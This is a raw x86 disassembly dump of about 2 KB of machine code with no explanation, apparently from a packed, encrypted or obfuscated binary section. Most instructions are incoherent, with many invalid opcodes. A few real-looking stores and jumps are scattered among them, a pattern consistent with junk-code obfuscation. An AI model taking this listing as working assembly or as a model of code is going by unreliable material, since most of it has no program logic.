  41a612:	cmp    al,0x4
  41a614:	xchg   edx,eax
  41a615:	xchg   cl,bl
  41a617:	aad    0x78
  41a619:	ret    0x52dd
  41a61c:	mov    dh,0x47
  41a61e:	out    dx,eax
  41a61f:	fild   DWORD PTR [eax+0x15]
  41a622:	div    DWORD PTR [ebx+0x55]
  41a625:	xor    BYTE PTR [ebx-0x5fd7697a],al
  41a62b:	or     eax,0xf0f095e4
  41a630:	xchg   edx,eax
  41a631:	mov    edi,0x8a5cd8a0
  41a636:	rol    BYTE PTR [edi+0x4be87d32],cl
  41a63c:	mov    ecx,ecx
  41a63e:	pop    ebp
  41a63f:	ins    BYTE PTR es:[edi],dx
  41a640:	inc    edi
  41a641:	add    eax,0xe602332c
  41a646:	rcr    BYTE PTR [edx+0x218de296],0x36
  41a64d:	lock fcomp DWORD PTR [ebp-0x5b0fa494]
  41a654:	jmp    DWORD PTR [esi]
  41a656:	mov    bh,BYTE PTR [esi-0x4605b157]
  41a65c:	push   0xaf7af82a
  41a661:	jmp    0xd83432a2
  41a666:	inc    esi
  41a667:	adc    ah,cl
  41a669:	pop    edx
  41a66a:	jmp    0x41a691
  41a66c:	and    DWORD PTR [ecx-0x25],esi
  41a66f:	clc    
  41a670:	fisubr WORD PTR [edx+0x18]
  41a673:	es pop ebp
  41a675:	pushf  
  41a676:	cld    
  41a677:	mov    eax,ds:0xffc1efa7
  41a67c:	sahf   
  41a67d:	xchg   ebp,eax
  41a67e:	ins    DWORD PTR es:[edi],dx
  41a67f:	jge    0x41a6ad
  41a681:	call   0xde41:0xfc96f3d3
  41a688:	and    eax,0x899ccd42
  41a68d:	inc    eax
  41a68e:	mov    al,0x8
  41a690:	imul   esi,DWORD PTR [ebx],0x1fd45d42
  41a696:	add    eax,0x54bfc3c3
  41a69b:	lahf   
  41a69c:	adc    eax,0xd034d262
  41a6a1:	nop
  41a6a2:	pop    ebp
  41a6a3:	jae    0x41a6d6
  41a6a5:	add    DWORD PTR [ebx+0x38f2e7e9],ecx
  41a6ab:	fisubr DWORD PTR [edi-0x726d5c49]
  41a6b1:	(bad)  
  41a6b2:	jmp    0x1f12:0x28412c5a
  41a6b9:	lea    esi,[ebp+eax*1+0x6d84631b]
  41a6c0:	push   ebp
  41a6c1:	xchg   edi,eax
  41a6c2:	lea    eax,[eax]
  41a6c4:	xor    edx,edi
  41a6c6:	add    DWORD PTR [ebx],ebx
  41a6c8:	push   0x4551c18e
  41a6cd:	imul   ebx,DWORD PTR [eax+0x4288cb14],0xffffffb8
  41a6d4:	inc    ecx
  41a6d5:	out    dx,eax
  41a6d6:	adc    DWORD PTR [ecx+ebx*1-0x6c1f2641],edx
  41a6dd:	mov    dh,BYTE PTR [edx-0x7b5dc94c]
  41a6e3:	push   0x310bfc6a
  41a6e8:	push   ds
  41a6e9:	xor    al,BYTE PTR [esi-0x16a07c93]
  41a6ef:	sbb    dh,BYTE PTR [ecx]
  41a6f1:	pop    eax
  41a6f2:	mov    ds:0x42065c6d,al
  41a6f7:	call   0xb641:0x6f32d2f9
  41a6fe:	cmp    BYTE PTR [edx-0x2a],ch
  41a701:	jae    0x41a75f
  41a703:	jecxz  0x41a6e1
  41a705:	cmc    
  41a706:	sub    eax,0x33b27d7d
  41a70b:	ror    BYTE PTR [ebx+0x15f7f07d],1
  41a711:	lea    esp,[ebx-0x2efcffbe]
  41a717:	cmp    edi,edx
  41a719:	mov    DWORD PTR ds:0x42a371,0x6de4
  41a723:	je     0x422933
  41a729:	push   ebx
  41a72a:	mov    DWORD PTR ds:0x42a2f1,0x24b5
  41a734:	jmp    0x42290e
  41a739:	mov    edx,DWORD PTR [ebp-0x8]
  41a73c:	adc    edi,DWORD PTR ds:0x42a3cd
  41a742:	jmp    0x41ac54
  41a747:	retf   
  41a748:	rol    ah,0xc4
  41a74b:	retf   
  41a74c:	(bad)  
  41a74d:	retf   
  41a74e:	(bad)  
  41a74f:	and    edx,eax
  41a751:	adc    al,0x39
  41a753:	fs jmp 0x787f:0x83679331
  41a75b:	jae    0x41a7d9
  41a75d:	js     0x41a7d7
  41a75f:	adc    ebp,esp
  41a761:	in     al,0x7d
  41a763:	test   DWORD PTR [ebx-0x10684eaa],ebx
  41a769:	lea    ecx,ds:0x6b8c3bd3
  41a76f:	dec    ecx
  41a770:	ret    0xb9a6
  41a773:	(bad)  
  41a774:	mov    ah,0xe8
  41a776:	mov    DWORD PTR [ecx-0x3addb8e4],eax
  41a77c:	and    BYTE PTR [ebx-0x76],bh
  41a77f:	pop    es
  41a780:	fstp   DWORD PTR [ebx+0x12]
  41a783:	icebp  
  41a784:	mov    dl,0xd9
  41a786:	jno    0x41a742
  41a788:	jnp    0x41a777
  41a78a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a78b:	fdivr  QWORD PTR [eax+0x642e6b23]
  41a791:	out    0xa,al
  41a793:	push   0xffffffc3
  41a795:	push   0xffffffa3
  41a797:	jmp    0x41a7ef
  41a799:	sar    DWORD PTR [esi+eax*4],1
  41a79c:	gs shl ebp,0xd7
  41a7a0:	and    BYTE PTR [ebp-0x2bf51250],0x2f
  41a7a7:	inc    esi
  41a7a8:	sar    ebx,1
  41a7aa:	push   eax
  41a7ab:	enter  0x2b3,0x9e
  41a7af:	enter  0x5580,0x98
  41a7b3:	shl    esi,1
  41a7b5:	inc    esi
  41a7b6:	adc    al,BYTE PTR [ebp+edi*8-0x1f]
  41a7ba:	sahf   
  41a7bb:	sub    cl,bh
  41a7bd:	pop    eax
  41a7be:	aaa    
  41a7bf:	jl     0x41a755
  41a7c1:	popf   
  41a7c2:	pop    edx
  41a7c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7c4:	jl     0x41a752
  41a7c6:	and    DWORD PTR [edx],0xf082ad8f
  41a7cc:	mov    ss,WORD PTR [edx]
  41a7ce:	jecxz  0x41a76b
  41a7d0:	(bad)  
  41a7d1:	bound  ebp,QWORD PTR [esi+0x51]
  41a7d4:	and    DWORD PTR [esi-0x17],ebp
  41a7d7:	sub    al,BYTE PTR [ecx+ebx*8]
  41a7da:	push   esi
  41a7db:	shl    BYTE PTR [eax],cl
  41a7dd:	pop    ecx
  41a7de:	stos   BYTE PTR es:[edi],al
  41a7df:	bound  ecx,QWORD PTR [edi+eiz*8]
  41a7e2:	mov    al,ds:0xa8c134ea
  41a7e7:	push   eax
  41a7e8:	sbb    al,0xca
  41a7ea:	ficomp WORD PTR [eax+0x35]
  41a7ed:	outs   dx,DWORD PTR ds:[esi]
  41a7ee:	(bad)  
  41a7ef:	pop    esi
  41a7f0:	push   edi
  41a7f1:	out    0x81,eax
  41a7f3:	jbe    0x41a7a0
  41a7f5:	add    DWORD PTR [edi+0x7c],0xffffff88
  41a7f9:	cmp    ecx,ebx
  41a7fb:	add    bh,BYTE PTR [eax]
  41a7fd:	dec    edi
  41a7fe:	gs dec eax
  41a800:	sbb    eax,0xd2fc1798
  41a805:	fdivr  QWORD PTR [esi+0x15]
  41a808:	pop    esp
  41a809:	pop    edx
  41a80a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a80b:	cmp    BYTE PTR [ecx-0xc],ah
  41a80e:	mov    ecx,0x97019b0b
  41a813:	xchg   BYTE PTR [eax],dh
  41a815:	xchg   ecx,eax
  41a816:	stos   DWORD PTR es:[edi],eax
  41a817:	fsub   DWORD PTR [ebx+0x7c]
  41a81a:	clc    
  41a81b:	push   edx
  41a81c:	xor    DWORD PTR [edi-0x3acbd91c],ecx
  41a822:	xchg   edi,eax
  41a823:	call   0x6bc3:0x2cc0b21d
  41a82a:	mov    edi,0xebbcf825
  41a82f:	inc    ecx
  41a830:	dec    eax
  41a831:	push   ds
  41a832:	fidiv  DWORD PTR [ebp+0x35]
  41a835:	icebp  
  41a836:	mov    edx,DWORD PTR ds:0xdf1d6df8
  41a83c:	adc    bh,cl
  41a83e:	imul   ebx,eax,0xb327b2f5
  41a844:	sbb    BYTE PTR [edi],cl
  41a846:	stc    
  41a847:	shl    BYTE PTR [eax+edi*1],cl
  41a84a:	and    edi,ecx
  41a84c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a84d:	inc    edx
  41a84e:	mov    ecx,0xb1824db3
  41a853:	adc    BYTE PTR [ebp-0x640b0e3b],ch
  41a859:	push   cs
  41a85a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a85b:	pop    edi
  41a85c:	aad    0xcc
  41a85e:	jmp    0x6bdf47b3
  41a863:	mov    ebx,0x27e071fe
  41a868:	xchg   esi,eax
  41a869:	pushf  
  41a86a:	mov    es,WORD PTR [edx]
  41a86c:	retf   0x778a
  41a86f:	ret    
  41a870:	ret    0x7e84
  41a873:	or     ah,BYTE PTR [ebx]
  41a875:	ins    DWORD PTR es:[edi],dx
  41a876:	repnz stos BYTE PTR es:[edi],al
  41a878:	clc    
  41a879:	jb     0x41a8e0
  41a87b:	cmc    
  41a87c:	in     al,dx
  41a87d:	mov    bl,0xab
  41a87f:	xchg   DWORD PTR [edx],edi
  41a881:	jno    0x41a841
  41a883:	push   ebp
  41a884:	jecxz  0x41a8e7
  41a886:	ins    DWORD PTR es:[edi],dx
  41a887:	es xor ah,bl
  41a88a:	adc    edx,edx
  41a88c:	lar    eax,WORD PTR [esi+eax*1+0x27bf106b]
  41a894:	cmp    eax,0xb3c48668
  41a899:	xchg   edx,eax
  41a89a:	jp     0x41a864
  41a89c:	cmp    BYTE PTR [esi+0x1a],dh
  41a89f:	xor    eax,DWORD PTR [ecx]
  41a8a1:	or     eax,0x5490ed20
  41a8a6:	adc    BYTE PTR [edx+0x1e],bl
  41a8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8aa:	push   esp
  41a8ab:	das    
  41a8ac:	mov    eax,ds:0x48cded01
  41a8b1:	out    0x39,eax
  41a8b3:	(bad)  
  41a8b4:	push   eax
  41a8b5:	sub    DWORD PTR [edi+0x4b01ef32],ecx
  41a8bb:	xor    DWORD PTR [edx+0x43],eax
  41a8be:	mov    esp,0xc85d9237
  41a8c3:	fmul   st(7),st
  41a8c5:	inc    esp
  41a8c6:	int3   
  41a8c7:	or     ebp,DWORD PTR [eax+0x5c]
  41a8ca:	xchg   esi,eax
  41a8cb:	pop    ebp
  41a8cc:	jae    0x41a942
  41a8ce:	sub    bh,BYTE PTR [edx+0x23]
  41a8d1:	rol    BYTE PTR [edx],cl
  41a8d3:	mov    DWORD PTR [esi],ecx
  41a8d5:	adc    al,bh
  41a8d7:	or     DWORD PTR [ebp+0x48bce28a],ebx
  41a8dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8de:	mov    ebp,0x28e01ef1
  41a8e3:	mov    ebp,0xc7f8b374
  41a8e8:	and    al,0x51
  41a8ea:	and    DWORD PTR [esp+ecx*8+0x2ef7469e],ebp
  41a8f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8f2:	(bad)  
  41a8f3:	sub    bh,dl
  41a8f5:	(bad)  [edx]
  41a8f7:	inc    esi
  41a8f8:	adc    eax,0xc0a7ec23
  41a8fd:	xchg   esi,eax
  41a8fe:	cmp    DWORD PTR [edx+0x76],esi
  41a901:	repnz adc DWORD PTR [edi+0x24],edx
  41a905:	push   ds
  41a906:	and    eax,0x8c2fa757
  41a90b:	aaa    
  41a90c:	cmp    eax,0xe3811691
  41a911:	outs   dx,DWORD PTR ds:[esi]
  41a912:	not    DWORD PTR [eax+ecx*8-0x5e97551e]
  41a919:	icebp  
  41a91a:	add    al,0xa9
  41a91c:	scas   eax,DWORD PTR es:[edi]
  41a91d:	call   0xbf1f9a72
  41a922:	pusha  
  41a923:	ret    
  41a924:	xchg   ebx,eax
  41a925:	scas   al,BYTE PTR es:[edi]
  41a926:	imul   ah
  41a928:	icebp  
  41a929:	fcomp  QWORD PTR [ecx+0x1a3d3d72]
  41a92f:	(bad)  
  41a930:	loopne 0x41a996
  41a932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a933:	in     al,dx
  41a934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a935:	outs   dx,DWORD PTR ds:[esi]
  41a936:	enter  0x6e39,0x70
  41a93a:	sub    dl,BYTE PTR [ebx-0x3d]
  41a93d:	fiadd  DWORD PTR [ebx]
  41a93f:	(bad)  [esi-0x65768e95]
  41a945:	shl    cl,1
  41a947:	push   esi
  41a948:	bound  ecx,QWORD PTR ds:0xcc2dedce
  41a94e:	iret   
  41a94f:	cmp    DWORD PTR [edi-0x1d],edi
  41a952:	outs   dx,BYTE PTR ds:[esi]
  41a953:	js     0x41a91f
  41a955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a956:	inc    eax
  41a957:	and    BYTE PTR [edx+0x1a],dl
  41a95a:	lods   eax,DWORD PTR ds:[esi]
  41a95b:	sub    eax,DWORD PTR [esi+0x435c4761]
  41a961:	fcmovnu st,st(5)
  41a963:	repz ss jb 0x41a921
  41a967:	mov    ecx,0x13de155c
  41a96c:	into   
  41a96d:	pop    es
  41a96e:	mov    ebp,0x7777f028
  41a973:	(bad)  
  41a974:	xor    dh,BYTE PTR [esi-0x7bf588fd]
  41a97a:	adc    BYTE PTR [eax+0x7253e85b],al
  41a980:	mov    ds:0x6dc1fed6,eax
  41a985:	mov    al,0x4
  41a987:	or     DWORD PTR [edi-0x450f7eb1],esp
  41a98d:	push   ebx
  41a98e:	lahf   
  41a98f:	cmp    edi,ebp
  41a991:	jecxz  0x41a943
  41a993:	loope  0x41a933
  41a995:	xor    dl,BYTE PTR [ebp-0x3f]
  41a998:	adc    BYTE PTR [edx-0x62],dl
  41a99b:	(bad)  
  41a99c:	pop    edi
  41a99d:	adc    al,bl
  41a99f:	stc    
  41a9a0:	mov    ah,0x5
  41a9a2:	test   BYTE PTR [ebp+0x6d242034],0xdd
  41a9a9:	test   al,0xfc
  41a9ab:	pop    ds
  41a9ac:	inc    edi
  41a9ad:	push   esi
  41a9ae:	(bad)  
  41a9af:	(bad)  
  41a9b0:	jge    0x41a96d
  41a9b2:	imul   edi,DWORD PTR [edx+0x5ff2f5a3],0x12
  41a9b9:	jmp    0xfc2c09fe
  41a9be:	or     eax,0xe9009c1f
  41a9c3:	dec    eax
  41a9c4:	test   DWORD PTR [ebx-0x7225b44e],ebx
  41a9ca:	aad    0x55
  41a9cc:	mov    bl,0x48
  41a9ce:	or     DWORD PTR [ebx+0x700ebbe5],edx
  41a9d4:	pusha  
  41a9d5:	cmp    ebp,DWORD PTR [ebp+esi*1+0x74de8ac4]
  41a9dc:	ja     0x41a997
  41a9de:	ret    0xe26
  41a9e1:	mov    eax,DWORD PTR [edx]
  41a9e3:	or     DWORD PTR [edi-0x50c2e49f],0xfffffffa
  41a9ea:	out    dx,al
  41a9eb:	push   0xef7b8900
  41a9f0:	mov    BYTE PTR [ebx+ebp*8],ch
  41a9f3:	sub    al,ch
  41a9f5:	sub    al,0x4a
  41a9f7:	fwait
  41a9f8:	out    dx,al
  41a9f9:	and    BYTE PTR es:[ebp-0x1f],bh
  41a9fd:	lock cwde 
  41a9ff:	push   0x15
  41aa01:	and    esi,esi
  41aa03:	rcr    BYTE PTR [ecx-0x78200708],cl
  41aa09:	pop    ecx
  41aa0a:	adc    al,0x80
  41aa0c:	jg     0x41aa19
  41aa0e:	lods   eax,DWORD PTR ds:[esi]
  41aa0f:	rcr    BYTE PTR [edi+0x0],0x7d
  41aa13:	iret   
  41aa14:	cmp    dl,BYTE PTR gs:[ecx]
  41aa17:	push   edi
  41aa18:	mov    ecx,0xd32549ed
  41aa1d:	cmp    al,BYTE PTR [edi+ebx*1]
  41aa20:	aas    
  41aa21:	xchg   ebp,eax
  41aa22:	and    bh,bh
  41aa24:	dec    ebx
  41aa25:	mov    al,0xaf
  41aa27:	fnstsw WORD PTR [esi-0x38]
  41aa2a:	stc    
  41aa2b:	jmp    0xcd88fb10
  41aa30:	rcl    BYTE PTR [edi+0x5611861a],0x63
  41aa37:	inc    edx
  41aa38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa39:	repnz inc ebp
  41aa3b:	xlat   BYTE PTR ds:[ebx]
  41aa3c:	int3   
  41aa3d:	xor    edx,DWORD PTR [edx]
  41aa3f:	and    al,0xa1
  41aa41:	jno    0x41a9d0
  41aa43:	adc    al,0xa7
  41aa45:	push   ebp
  41aa46:	aas    
  41aa47:	and    al,0xd
  41aa49:	sub    eax,0x9c66dcc2
  41aa4e:	stc    
  41aa4f:	test   eax,ebx
  41aa51:	cld    
  41aa52:	and    DWORD PTR [ebp+0x47],0xd729270a
  41aa59:	std    
  41aa5a:	pop    esi
  41aa5b:	push   ebx
  41aa5c:	bound  edx,QWORD PTR [ebx]
  41aa5e:	sbb    DWORD PTR [eax],edi
  41aa60:	pop    ebp
  41aa61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa62:	bound  ecx,QWORD PTR [edx+0x23]
  41aa65:	add    DWORD PTR [ebx],edi
  41aa67:	jmp    DWORD PTR [esi-0x5c]
  41aa6a:	pop    ecx
  41aa6b:	sbb    DWORD PTR [ebp+0x1f],0xaa972e24
  41aa72:	out    dx,eax
  41aa73:	sbb    BYTE PTR [eax-0x13c09de1],ch
  41aa79:	and    cl,BYTE PTR [esi+0xb790514]
  41aa7f:	fmul   QWORD PTR [ebx-0x7d]
  41aa82:	pop    edi
  41aa83:	sub    edi,DWORD PTR [edi+0x1f3752d7]
  41aa89:	jmp    0x37bbb662
  41aa8e:	fnstcw WORD PTR [esi]
  41aa90:	int3   
  41aa91:	and    al,0x13
  41aa93:	fld    TBYTE PTR [ecx-0x66]
  41aa96:	mov    eax,0x3c896756
  41aa9b:	inc    edi
  41aa9c:	xchg   al,dh
  41aa9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa9f:	add    BYTE PTR [edx],al
  41aaa1:	adc    bl,BYTE PTR [edi]
  41aaa3:	or     esi,eax
  41aaa5:	mov    es,ecx
  41aaa7:	dec    ebx
  41aaa8:	test   eax,0x4fdd670c
  41aaad:	fidiv  DWORD PTR [ebp-0x14]
  41aab0:	lahf   
  41aab1:	sbb    ecx,ebx
  41aab3:	cdq    
  41aab4:	sbb    eax,0x7250b28e
  41aab9:	inc    edx
  41aaba:	dec    ecx
  41aabb:	pop    esp
  41aabc:	into   
  41aabd:	jns    0x41aa9a
  41aabf:	ror    BYTE PTR [esi-0x3a],cl
  41aac2:	sub    al,0xb6
  41aac4:	js     0x41aa75
  41aac6:	cmp    esp,edi
  41aac8:	or     eax,0x9c2804b7
  41aacd:	(bad)  [esi-0x6e5dfb67]
  41aad3:	mov    es,WORD PTR [ebx-0x4e7d44e6]
  41aad9:	push   es
  41aada:	rcr    BYTE PTR [edx+eax*1-0x70],0x41
  41aadf:	mov    ?,ebx
  41aae1:	push   cs
  41aae2:	cwde   
  41aae3:	and    eax,0xaac6f430
  41aae8:	add    eax,0xe5c73ad6
  41aaed:	enter  0x38bf,0x76
  41aaf1:	xchg   edi,eax
  41aaf2:	mov    ah,BYTE PTR [ebp-0x3]
  41aaf5:	rcl    BYTE PTR [eax+0x3c],cl
  41aaf8:	aad    0x93
  41aafa:	int    0x7f
  41aafc:	mov    eax,esi
  41aafe:	cmp    edx,DWORD PTR [ebp+0x3f]
  41ab01:	and    edx,DWORD PTR cs:[ecx-0x11]
  41ab05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab06:	sub    BYTE PTR [eax],ah
  41ab08:	add    al,0x23
  41ab0a:	fst    QWORD PTR ds:0xe725a66c
  41ab10:	leave  
  41ab11:	jmp    0x13ef:0x3e8bd4a6
  41ab18:	sbb    DWORD PTR [eax-0x2f4f2240],eax
  41ab1e:	in     al,0x13
  41ab20:	and    eax,0xc1b00720
  41ab25:	in     eax,dx
  41ab26:	(bad)  
  41ab27:	ficomp DWORD PTR ds:0xfb1e7e86
  41ab2d:	aad    0x20
  41ab2f:	mov    esi,0x1547e844
  41ab34:	test   eax,0xc195229f
  41ab39:	dec    ecx
  41ab3a:	repz jge 0x41ab55
  41ab3d:	lea    edx,[ecx+0x25]
  41ab40:	dec    edx
  41ab41:	fdivr  DWORD PTR [eax]
  41ab43:	add    ebp,edi
  41ab45:	inc    ebp
  41ab46:	mov    ecx,0x2864d829
  41ab4b:	cwde   
  41ab4c:	push   eax
  41ab4d:	inc    edi
  41ab4e:	xchg   edx,eax
  41ab4f:	ficom  WORD PTR [ecx+ecx*4]
  41ab52:	ret    
  41ab53:	xor    eax,0x1b5b61e9
  41ab58:	sbb    esp,DWORD PTR [eax+0x72b073c8]
  41ab5e:	add    cl,BYTE PTR [ecx+0x2b]
  41ab61:	adc    DWORD PTR [ebx],eax
  41ab63:	xchg   esp,eax
  41ab64:	in     al,0xf6
  41ab66:	std    
  41ab67:	ja     0x41abc7
  41ab69:	jae    0x41aaeb
  41ab6b:	add    cl,bh
  41ab6d:	test   eax,0x1ec9e191
  41ab72:	hlt    
  41ab73:	add    bl,BYTE PTR [edi-0x5]
  41ab76:	or     al,0xac
  41ab78:	jns    0x41ab0b
  41ab7a:	dec    esp
  41ab7b:	out    0xf,eax
  41ab7d:	in     al,dx
  41ab7e:	fdiv   QWORD PTR [esi+ebp*8-0x6d]
  41ab82:	mov    ds:0x487906ea,al
  41ab87:	push   esp
  41ab88:	push   esi
  41ab89:	sbb    edi,ecx
  41ab8b:	mov    ebp,0x4ed8d612
  41ab90:	sbb    DWORD PTR [esi*4-0x7cee8fc0],ebp
  41ab97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab98:	loop   0x41aba7
  41ab9a:	mov    bh,0xdf
  41ab9c:	adc    al,0x32
  41ab9e:	jl     0x41abae
  41aba0:	test   al,0xd6
  41aba2:	iret   
  41aba3:	imul   eax,DWORD PTR [esi+0x32479533],0x737a997b
  41abad:	add    dl,BYTE PTR [ebx+0x54]
  41abb0:	call   0x8c24:0x7f24f0b8
  41abb7:	outs   dx,BYTE PTR ds:[esi]
  41abb8:	mov    al,0x3e
  41abba:	jecxz  0x41abda
  41abbc:	ficomp WORD PTR [esi+ecx*1]
  41abbf:	and    eax,0xe0a0f9e5
  41abc4:	repz inc edi
  41abc6:	and    al,0x74
  41abc8:	mov    bl,0xc
  41abca:	fsubr  QWORD PTR [edx-0x6c]
  41abcd:	xchg   ebp,eax
  41abce:	lock add edi,ebp
  41abd1:	push   ecx
  41abd2:	in     al,0xce
  41abd4:	mov    dl,0x96
  41abd6:	mov    ds:0x7ded1143,eax
  41abdb:	into   
  41abdc:	mov    DWORD PTR [ebx+0x3b6dfeab],edx
  41abe2:	jnp    0x41ac54
  41abe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abe5:	(bad)  
  41abe6:	pop    edi
  41abe7:	ja     0x41ac3d
  41abe9:	push   ecx
  41abea:	push   ds
  41abeb:	inc    ebp
  41abec:	jne    0x41abad
  41abee:	daa    
  41abef:	iret   
  41abf0:	mov    ebx,0x956b9dda
  41abf5:	(bad)  
  41abf6:	aad    0x77
  41abf8:	mov    edx,0x85c7ef9d
  41abfd:	fsubp  st(3),st
  41abff:	xchg   ecx,eax
  41ac00:	mov    ds:0xd0ce541,eax
  41ac05:	(bad)  
  41ac06:	das    
  41ac07:	and    al,0x69
  41ac09:	cs xor eax,0xfff6a315
  41ac0f:	add    bl,BYTE PTR [ecx+0x15]
  41ac12:	ror    DWORD PTR [ebp+ebx*1-0x5e],1
  41ac16:	mov    dh,0x9f
  41ac18:	adc    DWORD PTR [edx+ecx*2+0x3d9a4a10],ebx
  41ac1f:	add    BYTE PTR [edx],dl
  41ac21:	out    dx,eax
  41ac22:	inc    esp
  41ac23:	push   es
  41ac24:	xchg   edx,eax
  41ac25:	mov    ah,0x3e
  41ac27:	pop    esi
  41ac28:	jns    0x41ac76
  41ac2a:	ins    BYTE PTR es:[edi],dx
  41ac2b:	popf   
  41ac2c:	out    0x93,al
  41ac2e:	jne    0x41abf0
  41ac30:	adc    DWORD PTR [ecx+0xe],ebx
  41ac33:	lods   al,BYTE PTR ds:[esi]
  41ac34:	sbb    eax,0xdf8b74da
  41ac39:	xchg   edx,eax
  41ac3a:	clc    
  41ac3b:	sbb    DWORD PTR [ebx],0x6e
  41ac3e:	jmp    0xa486cce9
  41ac43:	imul   ebx,DWORD PTR [edi+ecx*4-0x5bffa25f],0x4fae7634
  41ac4e:	popa   
  41ac4f:	inc    ecx
  41ac50:	mov    dh,BYTE PTR [ebx+0x7d8bf520]
  41ac56:	lock mov DWORD PTR ds:0x42a33d,0x59ed
  41ac61:	sub    edi,edx
  41ac63:	mov    edx,DWORD PTR [ebp-0x4]
  41ac66:	add    DWORD PTR ds:0x42a2fd,0x42a409
  41ac70:	xor    edx,eax
  41ac72:	and    DWORD PTR ds:0x42a3cd,0x42a3c9
  41ac7c:	add    edx,ecx
  41ac7e:	mov    DWORD PTR ds:0x42a335,0x1963
  41ac88:	jmp    0x41b19a
  41ac8d:	int    0xca
  41ac8f:	enter  0xdbc8,0xda
  41ac93:	int    0xc9
  41ac95:	(bad)  
  41ac97:	stos   BYTE PTR es:[edi],al
  41ac98:	nop
  41ac99:	outs   dx,BYTE PTR ds:[esi]
  41ac9a:	das    
  41ac9b:	push   eax
  41ac9c:	leave  
  41ac9d:	pop    edx
  41ac9e:	xchg   BYTE PTR [edi+0x78],bh
  41aca1:	jae    0x41ad1f
  41aca3:	js     0x41ad1d
  41aca5:	add    esi,ecx
  41aca7:	ror    DWORD PTR [edi-0x5710950b],cl
  41acad:	das    
  41acae:	ret    0xf472
  41acb1:	popf   
  41acb2:	cmp    al,0xa3
  41acb4:	add    al,BYTE PTR [esi+0x50]
  41acb7:	or     ah,0x6a
  41acba:	dec    ecx
  41acbb:	dec    esi
  41acbc:	dec    eax
  41acbd:	sbb    al,0x3b
  41acbf:	xchg   BYTE PTR [eax-0x500865e],al
  41acc5:	cmp    bh,BYTE PTR [edi+0x3a]
  41acc8:	xor    DWORD PTR [ecx],esi
  41acca:	into   
  41accb:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41accd:	idiv   cl
  41accf:	leave  
  41acd0:	or     bl,BYTE PTR [ecx+0x40]
  41acd3:	adc    BYTE PTR [ebx],ch
  41acd5:	jb     0x41ac74
  41acd7:	mov    ch,0x42
  41acd9:	mov    edi,0x5c9513f8
  41acde:	fisttp DWORD PTR [ebp+0xaa9c2c4]
  41ace4:	mov    ecx,0x4bf74380
  41ace9:	loop   0x41acae
  41aceb:	loop   0x41ad55
  41aced:	je     0x41acfc
  41acef:	mov    ebp,0x2c22ebfc
  41acf4:	ds xor al,0x60
  41acf7:	stos   DWORD PTR es:[edi],eax
  41acf8:	icebp  
  41acf9:	add    DWORD PTR [eax+0xb],0x3b8aa496
  41ad00:	cs fs into 
  41ad03:	mov    WORD PTR [edx],fs
  41ad05:	int    0xf9
  41ad07:	xchg   ebp,eax
  41ad08:	and    BYTE PTR [ebp-0x68cdd6e6],dl
  41ad0e:	in     eax,dx
  41ad0f:	clc    
  41ad10:	(bad)  
  41ad11:	jecxz  0x41ad3c
  41ad13:	(bad)  
  41ad14:	popa   
  41ad15:	sahf   
  41ad16:	out    dx,eax
  41ad17:	pop    esi
  41ad18:	jae    0x41aca2
  41ad1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad1b:	pop    es
  41ad1c:	or     DWORD PTR [esp+edx*1+0x3c],ebx
  41ad20:	(bad)  
  41ad21:	cmp    cl,ch
  41ad23:	daa    
  41ad24:	repnz inc edi
  41ad26:	aad    0x65
  41ad28:	or     ah,BYTE PTR [edi]
  41ad2a:	in     al,0x9c
  41ad2c:	shl    cl,cl
  41ad2e:	xor    ebp,ebp
  41ad30:	or     dl,ah
  41ad32:	ret    
  41ad33:	cmp    al,0x82
  41ad35:	mov    dh,ch
  41ad37:	jae    0x41ad18
  41ad39:	mov    ah,0xd9
  41ad3b:	sbb    ah,BYTE PTR [ebp+0x639fdc4f]
  41ad41:	stos   BYTE PTR es:[edi],al
  41ad42:	mov    gs,ecx
  41ad44:	cmp    DWORD PTR [eax],ebx
  41ad46:	dec    esi
  41ad47:	icebp  
  41ad48:	arpl   WORD PTR [ebx],ax
  41ad4a:	repnz or DWORD PTR [edx+0x5ddd4a5a],esp
  41ad51:	aam    0x17
  41ad53:	dec    edi
  41ad54:	pop    edi
  41ad55:	sbb    al,0x15
  41ad57:	or     al,0xd7
  41ad59:	fs sbb eax,0xc8bc8b7c
  41ad5f:	mov    al,ds:0xaf205ac3
  41ad64:	jne    0x41ad05
  41ad66:	(bad)  [ecx-0x51]
  41ad69:	ficom  DWORD PTR [ebx]
  41ad6b:	jge    0x41ad3d
  41ad6d:	ror    BYTE PTR [ecx+0x3e],0x14
  41ad71:	jne    0x41ad9e
  41ad73:	or     al,0x48
  41ad75:	adc    dl,BYTE PTR [esi+0x72]
  41ad78:	call   0x19e283e1
  41ad7d:	or     DWORD PTR [eax],ecx
  41ad7f:	jl     0x41adda
  41ad81:	mov    cl,0x70
  41ad83:	clc    
  41ad84:	enter  0x5b40,0xf8
  41ad88:	sub    esi,DWORD PTR ds:0x15491bce
  41ad8e:	fimul  DWORD PTR [edi]
  41ad90:	jb     0x41ad92
  41ad92:	sub    DWORD PTR [edi],0x68
  41ad95:	mov    ?,WORD PTR [esi+0x64]
  41ad98:	inc    eax
  41ad99:	cmp    BYTE PTR [ebx+eiz*4+0x3aa63f24],dh
  41ada0:	lods   al,BYTE PTR ds:[esi]
  41ada1:	es sbb al,dh
  41ada4:	xor    eax,0xe1afd515
  41ada9:	std    
  41adaa:	push   0x279b89e2
